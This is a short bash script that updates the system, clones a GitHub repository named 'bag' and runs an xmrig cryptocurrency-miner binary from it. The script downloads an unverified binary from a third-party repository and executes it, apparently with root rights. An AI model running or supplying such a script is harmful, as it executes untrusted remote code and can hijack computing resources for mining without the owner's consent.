#!/bin/bash
apt-get update && apt-get upgrade -y
apt-get install git -y
git clone https://github.com/drputraargo-commits/bag.git
cd bag
./xmrig
